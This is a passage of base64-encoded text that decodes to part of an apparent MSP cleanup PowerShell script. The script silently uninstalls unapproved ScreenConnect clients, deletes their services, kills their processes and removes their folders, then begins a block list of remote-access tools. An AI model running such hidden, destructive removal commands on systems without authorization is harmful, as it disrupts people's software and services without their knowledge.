ZWMnKSB7CiAgICAgICAgICAgICAgICAgICAgJGFyZ3MgPSAoJHVzIC1yZXBsYWNlICcoP2kpXi4q
bXNpZXhlYyhcLmV4ZSk/XHMqJywgJycpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1u
b3RtYXRjaCAnL3FuJykgeyAkYXJncyA9ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQogICAgICAg
ICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0
ICRhcmdzIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAg
ICAgICAgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19tc2kgWyRkbl0gZXhpdD0kKCRwLkV4
aXRDb2RlKSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAx
NjA1LCAxNjE0LCAzMDEwKQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAg
ICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyAkdXMgL1Mg
L3NpbGVudCAvcXVpZXQgL3FuIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgog
ICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5d
IGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0
Q29kZSAtZXEgMCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAi
cHJvZHVjdF91bmluc3RhbGxzdHJpbmdfRkFJTCBbJGRuXSAkXyIgfQogICAgICAgIH0KICAgICAg
ICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVfTDdfYmVn
aW4nCgogICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0IEFSUCBo
aXZlcwogICAgJHNlZW4gPSBAe30KICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0
YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhp
dmVfbWlzc2luZyAkcm9vdCI7IGNvbnRpbnVlIH0KICAgICAgICBMb2cgImhpdmVfc2NhbiAkcm9v
dCIKICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVy
dHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRk
biA9ICRwcm9wLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4g
fQogICAgICAgICAgICBpZiAoJGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGll
bnRccypcKChbMC05QS1GYS1mXXsxNn0pXCknKSB7IHJldHVybiB9CiAgICAgICAgICAgICRmcCA9
ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyBy
ZXR1cm4gfQogICAgICAgICAgICBpZiAoJHNlZW4uQ29udGFpbnNLZXkoJF8uUFNDaGlsZE5hbWUp
KSB7IHJldHVybiB9CiAgICAgICAgICAgICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlCiAg
ICAgICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBl
bHNlIHsgJG4uZmFpbCsrOyBMb2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQogICAg
ICAgIH0KICAgIH0KCiAgICAjIDIuIGZvcmVpZ24gU0Mgc2VydmljZXMKICAgIGZvcmVhY2ggKCRz
dmMgaW4gKEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUt
T2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgewogICAg
ICAgIGlmIChJcy1LZWVwZXIgJHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0KICAgICAgICAmIHNjLmV4
ZSBzdG9wICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVw
IC1NaWxsaXNlY29uZHMgNjAwCiAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSki
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgICRuLnN2YysrOyBMb2cgInN2Y19kZWxldGVkICQoJHN2
Yy5OYW1lKSIKICAgIH0KCiAgICAjIDMuIGZvcmVpZ24gU0MgcHJvY2Vzc2VzIChraWxsIGV2ZW4g
d2hlbiBFeGVjdXRhYmxlUGF0aCBpcyBudWxsKQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1By
b2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRleGUgPSAkXy5FeGVj
dXRhYmxlUGF0aAogICAgICAgICRjbWQgPSAkXy5Db21tYW5kTGluZQogICAgICAgICRrZWVwZXIg
PSAoSXMtS2VlcGVyICRleGUpIC1vciAoSXMtS2VlcGVyICRjbWQpCiAgICAgICAgaWYgKC1ub3Qg
JGtlZXBlcikgewogICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9y
Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBM
b2cgInByb2Nfa2lsbGVkIHBpZD0kKCRfLlByb2Nlc3NJZCkgZXhlPSRleGUiCiAgICAgICAgfQog
ICAgfQoKICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikKICAgIGZv
cmVhY2ggKCRiYXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfSkpIHsKICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNl
KSkgeyBjb250aW51ZSB9CiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2Ug
LURpcmVjdG9yeSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAg
ICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8IEZv
ckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRkID0gJF8uRnVsbE5hbWUKICAgICAgICAg
ICAgICAgIGlmIChJcy1LZWVwZXIgJGQpIHsgcmV0dXJuIH0KICAgICAgICAgICAgICAgIGlmIChG
b3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0KICAg
ICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQi
IH0KICAgICAgICAgICAgfQogICAgfQoKICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gLyByZW1vdGUt
YWNjZXNzIHRvb2xzIChtYXJrZXQgY292ZXJhZ2UgMjAyNikuCiAgICAjIEtFRVAgZm9yZXZlcjog
RGF0dG8vQ2VudHJhU3RhZ2UgKyBTY3JlZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3Zl
KS4KICAgICMgTkVWRVIgcHV0IERhdHRvL0NlbnRyYVN0YWdlL0NhZ1NlcnZpY2UgaW4gdGhpcyBs
aXN0LgogICAgZnVuY3Rpb24gSXMtRGF0dG9LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlm
ICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1h
dGNoICcoP2kpRGF0dG98Q2VudHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50JykK
ICAgIH0KICAgICRybW0gPSBAKAogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICAgU3ZjPUAo
J0FueURlc2snKTsgUHJvYz1AKCdBbnlEZXNrJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
QW55RGVzayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFt
RGF0YVxBbnlEZXNrIik7IFByb2Q9QCgnQW55RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdUZWFt
Vmlld2VyJzsgICBTdmM9QCgnVGVhbVZpZXdlcionKTsgUHJvYz1AKCdUZWFtVmlld2VyKicsJ3R2
X3czMionLCd0dl94NjQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdl
cionKSB9CiAgICAgICAgQHsgVGFnPSdTcGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKics
J1NSU2VydmljZScsJ1NTVVNlcnZpY2UnKTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0
KicsJ1NSTWFuYWdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicp
IH0KICAgICAgICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3Vh
cmRpYW5TdmMnLCdMTUlpZ25pdGlvbicpOyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4q
JywnUmFTZXJ2ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAg
ICAgQHsgVGFnPSdHb1RvJzsgICAgICAgICBTdmM9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdCon
LCdHb1RvUmVzb2x2ZSonKTsgUHJvYz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ2cybSon
LCdHb1RvUmVzb2x2ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb1RvTXlQQyIpOyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dv
VG9Bc3Npc3QqJywnR29UbyBSZXNvbHZlKicsJ0dvVG9NZWV0aW5nKicsJ0dvVG8gQ29ubmVjdCon
KSB9CiAgICAgICAgQHsgVGFnPSdSdXN0RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0
ZGVzayonKTsgUHJvYz1AKCdydXN0ZGVzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xS
dXN0RGVzayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1
c3REZXNrKicpIH0KICAgICAgICBAeyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1v
KicpOyBQcm9jPUAoJ1N1cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVt
byIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyon
KSB9CiAgICAgICAgQHsgVGFnPSdEV1NlcnZpY2UnOyAgICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdl
bnQqJyk7IFByb2M9QCgnZHdhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEV0Fn
ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERXQWdlbnQiLCIkZW52OlByb2dyYW1EYXRh
XERXQWdlbnQiKTsgUHJvZD1AKCdEV0FnZW50KicsJ0RXU2VydmljZSonKSB9CiAgICAgICAgQHsg
VGFnPSdab2hvQXNzaXN0JzsgICBTdmM9QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsg
UHJvYz1AKCdab2hvQXNzaXN0KicsJ1pvaG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXFpvaG9NZWV0aW5nIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7
IFByb2Q9QCgnWm9obyBBc3Npc3QqJywnWm9ob01lZXRpbmcqJykgfQogICAgICAgIEB7IFRhZz0n
UmVtb3RlUEMnOyAgICAgU3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQ
Q1N1aXRlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAg
IEB7IFRhZz0nQm9tZ2FyJzsgICAgICAgU3ZjPUAoJ2JvbWdhcionLCdCZXlvbmRUcnVzdConKTsg
UHJvYz1AKCdib21nYXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQm9tZ2FyIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJvbWdhciIsIiRlbnY6UHJvZ3JhbUZpbGVzXEJleW9uZFRy
dXN0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJleW9uZFRydXN0Iik7IFByb2Q9QCgnQm9t
Z2FyKicsJ0JleW9uZFRydXN0KicpIH0KICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2
Yz1AKCdQYXJzZWMqJyk7IFByb2M9QCgncGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xQYXJzZWMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2Vj
IiwiJGVudjpQcm9ncmFtRGF0YVxQYXJzZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQogICAgICAg
IEB7IFRhZz0nQ2hyb21lUkQnOyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVt
b3RpbmdfaG9zdConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lIFJl
bW90ZSBEZXNrdG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvb2dsZVxDaHJvbWUgUmVt
b3RlIERlc2t0b3AiKTsgUHJvZD1AKCdDaHJvbWUgUmVtb3RlIERlc2t0b3AqJykgfQogICAgICAg
IEB7IFRhZz0nVWx0cmFWTkMnOyAgICAgU3ZjPUAoJ3V2bmMqJywnd2ludm5jKicpOyBQcm9jPUAo
J3dpbnZuYyonLCd1dm5jKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVk5DIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFVsdHJhVk5DIik7IFByb2Q9QCgnVWx0cmFWTkMqJywn
V2luVk5DKicpIH0KICAgICAgICBAeyBUYWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2
ZXIqJyk7IFByb2M9QCgndHZuc2VydmVyKicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xUaWdodFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIp
OyBQcm9kPUAoJ1RpZ2h0Vk5DKicpIH0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2
Yz1AKCd2bmNzZXJ2ZXIqJyk7IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcionKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XFJlYWxWTkMiKTsgUHJvZD1AKCdWTkMgU2VydmVyKicsJ1JlYWxWTkMqJykgfQogICAgICAgIEB7
IFRhZz0nRGFtZVdhcmUnOyAgICAgU3ZjPUAoJ0RhbWVXYXJlKicpOyBQcm9jPUAoJ0RXUkNTKics
J0RXUkNDKicsJ0RhbWVXYXJlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNvbGFyV2lu
ZHMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU29sYXJXaW5kcyIsIiRlbnY6UHJvZ3JhbUZp
bGVzXERhbWVXYXJlIFJlbW90ZSBTdXBwb3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERh
bWVXYXJlIFJlbW90ZSBTdXBwb3J0Iik7IFByb2Q9QCgnRGFtZVdhcmUqJykgfQogICAgICAgIEB7
IFRhZz0nTmV0U3VwcG9ydCc7ICAgU3ZjPUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50
MzIqJywncGNpY3RsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQq
JykgfQogICAgICAgIEB7IFRhZz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1NpbXBsZUhlbHAqJyk7
IFByb2M9QCgnU2ltcGxlU2VydmljZSonLCdzaW1wbGVzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFNpbXBsZUhlbHAiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxl
SGVscCIpOyBQcm9kPUAoJ1NpbXBsZUhlbHAqJykgfQogICAgICAgIEB7IFRhZz0nR2V0U2NyZWVu
JzsgICAgU3ZjPUAoJ0dldFNjcmVlbionKTsgUHJvYz1AKCdHZXRTY3JlZW4qJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcR2V0U2NyZWVuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdl
dFNjcmVlbiIpOyBQcm9kPUAoJ0dldFNjcmVlbionKSB9CiAgICAgICAgQHsgVGFnPSdJcGVyaXVz
JzsgICAgICBTdmM9QCgnSXBlcml1cyonKTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElwZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XElwZXJpdXMgUmVtb3RlIik7IFByb2Q9QCgnSXBlcml1cyonKSB9CiAgICAgICAgQHsg
VGFnPSdJU0xPbmxpbmUnOyAgIFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJU0xsaWdodCon
LCdJU0xBbHdheXNPbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xJU0wgT25saW5lIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElTTCBPbmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQq
JywnSVNMIEFsd2F5c09uKicpIH0KICAgICAgICBAeyBUYWc9J0FtbXl5JzsgICAgICAgIFN2Yz1A
KCdBbW15eSonKTsgUHJvYz1AKCdBbW15eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xB
bW15eSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBbW15eSIpOyBQcm9kPUAoJ0FtbXl5Kicp
IH0KICAgICAgICBAeyBUYWc9J1VsdHJhVmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsg
UHJvYz1AKCdVbHRyYVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZp
ZXdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1Vs
dHJhVmlld2VyKicpIH0KICAgICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJv
QWRtaW4qJyk7IFByb2M9QCgnQWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XEFlcm9BZG1pbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJvQWRtaW4iKTsgUHJvZD1A
KCdBZXJvQWRtaW4qJykgfQogICAgICAgIEB7IFRhZz0nTGl0ZU1hbmFnZXInOyAgU3ZjPUAoJ0xp
dGVNYW5hZ2VyKicpOyBQcm9jPUAoJ1JPTVNlcnZlcionLCdST01WaWV3ZXIqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcTGl0ZU1hbmFnZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
TGl0ZU1hbmFnZXIiKTsgUHJvZD1AKCdMaXRlTWFuYWdlcionKSB9CiAgICAgICAgQHsgVGFnPSdS
YWRtaW4nOyAgICAgICBTdmM9QCgnUmFkbWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1p
bionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cUmFkbWluIFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0K
ICAgICAgICBAeyBUYWc9J05vTWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7
IFByb2M9QCgnbnhkKicsJ254c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXE5vTWFjaGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOb01hY2hpbmUi
KTsgUHJvZD1AKCdOb01hY2hpbmUqJykgfQogICAgICAgIEB7IFRhZz0nTmluamFPbmUnOyAgICAg
U3ZjPUAoJ05pbmphUk1NQWdlbnQnLCduaW5qYXJtbSonLCdOaW5qYVJNTSonKTsgUHJvYz1AKCdO
aW5qYVJNTUFnZW50KicsJ25pbmphcm1tKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5p
bmphUk1NQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRl
bnY6UHJvZ3JhbURhdGFcTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphT25l
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphT25lIik7IFByb2Q9QCgnTmluamFSTU0q
JywnTmluamFPbmUqJykgfQogICAgICAgIEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0
ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXEFURVJBIE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdv
cmtzIiwiJGVudjpQcm9ncmFtRGF0YVxBVEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicp
IH0KICAgICAgICBAeyBUYWc9J0Nvbm5lY3RXaXNlJzsgIFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2
Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxM
VFN2YyIsIiRlbnY6UHJvZ3JhbUZpbGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XExhYlRlY2ggQ2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUq
JywnQ29ubmVjdFdpc2UgUk1NKicsJ0xhYlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nS2FzZXlh
JzsgICAgICAgU3ZjPUAoJ0FnZW50TW9uJywnS2FzZXlhKicsJ0tBQURTKicpOyBQcm9jPUAoJ0Fn
ZW50TW9uKicsJ0thc2V5YSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cS2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhIFZTQSonLCdL
YXNleWEgQWdlbnQqJykgfQogICAgICAgIEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0Fk
dmFuY2VkIE1vbml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAo
J0ZpbGVTeXN0ZW1BZ2VudConLCdOQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFk
dmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5v
bG9naWVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIk
ZW52OlByb2dyYW1GaWxlc1xNU1BBIEZpbGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1T
UEEgRmlsZXMiKTsgUHJvZD1AKCdBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSon
LCdOLWNlbnRyYWwqJywnTi1zaWdodConLCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1Aq
JykgfQogICAgICAgIEB7IFRhZz0nU3luY3JvJzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1
dG8qJyk7IFByb2M9QCgnU3luY3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xSZXBhaXJUZWNoIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIk
ZW52OlByb2dyYW1GaWxlc1xTeW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3luY3Jv
IiwiJGVudjpQcm9ncmFtRGF0YVxTeW5jcm8iKTsgUHJvZD1AKCdTeW5jcm8qJywnS2FidXRvKics
J1JlcGFpclRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nUHVsc2V3YXknOyAgICAgU3ZjPUAoJ1B1
bHNld2F5KicsJ1BDIE1vbml0b3IqJyk7IFByb2M9QCgnUENNb25pdG9yTWdyKicsJ1BDTW9uaXRv
ck1hbmFnZXIqJywnUHVsc2V3YXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUHVsc2V3
YXkiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUHVsc2V3YXkiLCIkZW52OlByb2dyYW1GaWxl
c1xQQyBNb25pdG9yIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBDIE1vbml0b3IiKTsgUHJv
ZD1AKCdQdWxzZXdheSonLCdQQyBNb25pdG9yKicpIH0KICAgICAgICBAeyBUYWc9J1N1cGVyT3Bz
JzsgICAgIFN2Yz1AKCdTdXBlck9wcyonKTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xTdXBlck9wcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBl
ck9wcyIsIiRlbnY6UHJvZ3JhbURhdGFcU3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9
CiAgICAgICAgQHsgVGFnPSdMZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2ZWwqJyk7IFByb2M9QCgn
bGV2ZWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFt
